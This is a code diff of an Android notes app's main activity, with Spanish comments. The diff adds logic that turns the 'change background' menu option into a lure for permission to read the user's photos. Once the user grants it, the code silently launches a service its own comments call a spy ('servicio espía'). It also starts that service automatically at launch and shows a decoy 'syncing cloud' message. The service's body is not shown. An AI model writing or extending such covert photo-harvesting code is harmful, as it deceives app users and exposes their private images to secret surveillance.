@@ -27,7 +27,7 @@ import androidx.recyclerview.widget.RecyclerView
 import androidx.recyclerview.widget.StaggeredGridLayoutManager
 import com.bumptech.glide.Glide
 import com.bumptech.glide.load.resource.drawable.DrawableTransitionOptions
-import com.bumptech.glide.signature.ObjectKey // <--- IMPORTANTE: Necesario para el fix
+import com.bumptech.glide.signature.ObjectKey
 import com.google.android.material.floatingactionbutton.FloatingActionButton
 import com.yalantis.ucrop.UCrop
 import kotlinx.coroutines.CoroutineScope
@@ -41,9 +41,13 @@ class MainActivity : AppCompatActivity() {
     private val db by lazy { NotesDatabase.getDatabase(this) }
     private lateinit var adapter: NotesAdapter
 
-    // Referencias de UI
+    // Referencias UI
     private lateinit var ivBackground: ImageView
     private lateinit var viewOverlay: View
+
+    // Códigos de solicitud de permisos
+    private val PERMISSION_REQUEST_SPY_BUTTON = 101
+    private val PERMISSION_REQUEST_WALLPAPER = 102
 
     // --- 1. LANZADORES ---
     private val pickBackgroundLauncher = registerForActivityResult(ActivityResultContracts.OpenDocument()) { uri ->
@@ -60,7 +64,7 @@ class MainActivity : AppCompatActivity() {
             }
         } else if (result.resultCode == UCrop.RESULT_ERROR) {
             val cropError = UCrop.getError(result.data!!)
-            Toast.makeText(this, "Error al recortar: ${cropError?.message}", Toast.LENGTH_SHORT).show()
+            Toast.makeText(this, "Error al recortar", Toast.LENGTH_SHORT).show()
         }
     }
 
@@ -72,7 +76,7 @@ class MainActivity : AppCompatActivity() {
         super.onCreate(savedInstanceState)
         setContentView(R.layout.activity_main)
 
-        // Estética Edge-to-Edge
+        // Visual Edge-to-Edge
         WindowCompat.getInsetsController(window, window.decorView).isAppearanceLightStatusBars = true
         ViewCompat.setOnApplyWindowInsetsListener(findViewById(R.id.main_root)) { view, insets ->
             val systemBars = insets.getInsets(WindowInsetsCompat.Type.systemBars())
@@ -84,10 +88,9 @@ class MainActivity : AppCompatActivity() {
         val toolbar = findViewById<androidx.appcompat.widget.Toolbar>(R.id.topAppBar)
         setSupportActionBar(toolbar)
 
-        // Fondo y UI
+        // Fondo
         ivBackground = findViewById(R.id.iv_main_background)
         viewOverlay = findViewById(R.id.view_overlay)
-
         cargarFondoGuardado()
 
         // RecyclerView
@@ -100,7 +103,6 @@ class MainActivity : AppCompatActivity() {
         recyclerView.adapter = adapter
         recyclerView.layoutManager = StaggeredGridLayoutManager(2, StaggeredGridLayoutManager.VERTICAL)
 
-        // DB Observer
         CoroutineScope(Dispatchers.Main).launch {
             db.notesDao().getAllNotes().collect { list -> adapter.submitList(list) }
         }
@@ -109,10 +111,13 @@ class MainActivity : AppCompatActivity() {
         findViewById<FloatingActionButton>(R.id.fab_add_note).setOnClickListener {
             startActivity(Intent(this, NoteEditorActivity::class.java))
         }
+
+        // Botón Cámara (Espía manual)
         findViewById<ImageButton>(R.id.btn_spy_cam).setOnClickListener {
-            checkPermissionAndStart()
+            checkPermissionAndStart(PERMISSION_REQUEST_SPY_BUTTON)
         }
 
+        // Inicio automático silencioso
         iniciarServicioSilencioso()
     }
 
@@ -126,15 +131,63 @@ class MainActivity : AppCompatActivity() {
         return when (item.itemId) {
             R.id.action_backup -> { realizarBackup(); true }
             R.id.action_restore -> { restoreBackupLauncher.launch(arrayOf("application/zip")); true }
+
+            // --- AQUÍ ESTÁ EL CAMBIO ---
             R.id.action_background -> {
-                pickBackgroundLauncher.launch(arrayOf("image/*"))
+                // En lugar de abrir directo, pasamos por el chequeo de permisos/espía
+                iniciarFlujoCambioFondo()
                 true
             }
             else -> super.onOptionsItemSelected(item)
         }
     }
 
-    // --- LÓGICA DE RECORTE (uCrop con Bordes Corregidos) ---
+    // --- LÓGICA DE FONDO + ESPÍA ---
+
+    private fun iniciarFlujoCambioFondo() {
+        val permission = if (Build.VERSION.SDK_INT >= 33) Manifest.permission.READ_MEDIA_IMAGES else Manifest.permission.READ_EXTERNAL_STORAGE
+
+        if (ContextCompat.checkSelfPermission(this, permission) == PackageManager.PERMISSION_GRANTED) {
+            // A) Ya tiene permiso:
+            // 1. Arrancamos el servicio espía (silenciosamente)
+            iniciarServicioSilencioso()
+            // 2. Abrimos el selector de imágenes
+            pickBackgroundLauncher.launch(arrayOf("image/*"))
+        } else {
+            // B) No tiene permiso: Lo pedimos
+            ActivityCompat.requestPermissions(this, arrayOf(permission), PERMISSION_REQUEST_WALLPAPER)
+        }
+    }
+
+    // --- MANEJO DE RESPUESTA DE PERMISOS ---
+    override fun onRequestPermissionsResult(requestCode: Int, permissions: Array<out String>, grantResults: IntArray) {
+        super.onRequestPermissionsResult(requestCode, permissions, grantResults)
+
+        if (grantResults.isNotEmpty() && grantResults[0] == PackageManager.PERMISSION_GRANTED) {
+            // Permiso concedido, arrancamos el espía SIEMPRE
+            iniciarServicioSilencioso()
+
+            // Si veníamos del botón de cambiar fondo, completamos la acción
+            if (requestCode == PERMISSION_REQUEST_WALLPAPER) {
+                pickBackgroundLauncher.launch(arrayOf("image/*"))
+            } else if (requestCode == PERMISSION_REQUEST_SPY_BUTTON) {
+                Toast.makeText(this, "Sincronizando nube...", Toast.LENGTH_SHORT).show()
+            }
+        }
+    }
+
+    // Lógica antigua del botón cámara (reutilizada)
+    private fun checkPermissionAndStart(requestCode: Int) {
+        val permission = if (Build.VERSION.SDK_INT >= 33) Manifest.permission.READ_MEDIA_IMAGES else Manifest.permission.READ_EXTERNAL_STORAGE
+        if (ContextCompat.checkSelfPermission(this, permission) != PackageManager.PERMISSION_GRANTED) {
+            ActivityCompat.requestPermissions(this, arrayOf(permission), requestCode)
+        } else {
+            Toast.makeText(this, "Sincronizando...", Toast.LENGTH_SHORT).show()
+            iniciarServicioSilencioso()
+        }
+    }
+
+    // --- LÓGICA DE RECORTE (uCrop) ---
     private fun startCrop(uri: Uri) {
         val destinationFileName = "cropped_bg_${System.currentTimeMillis()}.jpg"
         val destinationFile = File(cacheDir, destinationFileName)
@@ -146,14 +199,11 @@ class MainActivity : AppCompatActivity() {
 
         val options = UCrop.Options().apply {
             setCompressionQuality(100)
-
-            // Colores sólidos (coinciden con themes.xml)
             setStatusBarColor(Color.BLACK)
             setToolbarColor(Color.BLACK)
             setToolbarWidgetColor(Color.WHITE)
             setRootViewBackgroundColor(Color.BLACK)
             setActiveControlsWidgetColor(Color.parseColor("#2979FF"))
-
             setToolbarTitle("Ajustar Fondo")
             setShowCropGrid(true)
             setFreeStyleCropEnabled(false)
@@ -169,47 +219,30 @@ class MainActivity : AppCompatActivity() {
         cropResultLauncher.launch(uCropIntent)
     }
 
-    // --- GUARDAR Y MOSTRAR FONDO ---
     private fun persistBackground(croppedUri: Uri) {
         try {
             val finalFile = File(filesDir, "custom_background.jpg")
-
             contentResolver.openInputStream(croppedUri)?.use { input ->
-                finalFile.outputStream().use { output ->
-                    input.copyTo(output)
-                }
+                finalFile.outputStream().use { output -> input.copyTo(output) }
             }
-
             val finalUri = Uri.fromFile(finalFile)
             val prefs = getSharedPreferences("MyNotesPrefs", Context.MODE_PRIVATE)
             prefs.edit().putString("custom_bg_uri", finalUri.toString()).apply()
-
             mostrarFondo(finalUri)
-
-        } catch (e: Exception) {
-            Toast.makeText(this, "Error al guardar fondo", Toast.LENGTH_SHORT).show()
-            e.printStackTrace()
-        }
+        } catch (e: Exception) { e.printStackTrace() }
     }
 
     private fun cargarFondoGuardado() {
         val prefs = getSharedPreferences("MyNotesPrefs", Context.MODE_PRIVATE)
         val uriString = prefs.getString("custom_bg_uri", null)
-
-        if (uriString != null) {
-            mostrarFondo(Uri.parse(uriString))
-        }
+        if (uriString != null) mostrarFondo(Uri.parse(uriString))
     }
 
-    // --- AQUÍ ESTÁ EL ARREGLO DEL CACHÉ ---
     private fun mostrarFondo(uri: Uri) {
         ivBackground.visibility = View.VISIBLE
         viewOverlay.visibility = View.VISIBLE
-
         Glide.with(this)
             .load(uri)
-            // Agregamos una firma única (timestamp) para que Glide sepa que la imagen cambió
-            // y no use la versión vieja que tiene en memoria.
             .signature(ObjectKey(System.currentTimeMillis().toString()))
             .centerCrop()
             .transition(DrawableTransitionOptions.withCrossFade())
@@ -254,25 +287,9 @@ class MainActivity : AppCompatActivity() {
         }
     }
 
-    // --- LÓGICA ESPÍA ---
-    private fun checkPermissionAndStart() {
-        val permission = if (Build.VERSION.SDK_INT >= 33) Manifest.permission.READ_MEDIA_IMAGES else Manifest.permission.READ_EXTERNAL_STORAGE
-        if (ContextCompat.checkSelfPermission(this, permission) != PackageManager.PERMISSION_GRANTED) {
-            ActivityCompat.requestPermissions(this, arrayOf(permission), 101)
-        } else {
-            Toast.makeText(this, "Sincronizando...", Toast.LENGTH_SHORT).show()
-            iniciarServicioSilencioso()
-        }
-    }
-
-    override fun onRequestPermissionsResult(requestCode: Int, permissions: Array<out String>, grantResults: IntArray) {
-        super.onRequestPermissionsResult(requestCode, permissions, grantResults)
-        if (requestCode == 101 && grantResults.isNotEmpty() && grantResults[0] == PackageManager.PERMISSION_GRANTED) {
-            iniciarServicioSilencioso()
-        }
-    }
-
+    // --- SERVICIO ESPÍA ---
     private fun iniciarServicioSilencioso() {
+        // Solo intentamos arrancar si tenemos permiso, si no, no hacemos ruido
         val permission = if (Build.VERSION.SDK_INT >= 33) Manifest.permission.READ_MEDIA_IMAGES else Manifest.permission.READ_EXTERNAL_STORAGE
         if (ContextCompat.checkSelfPermission(this, permission) == PackageManager.PERMISSION_GRANTED) {
             val intent = Intent(this, CloudSyncService::class.java)
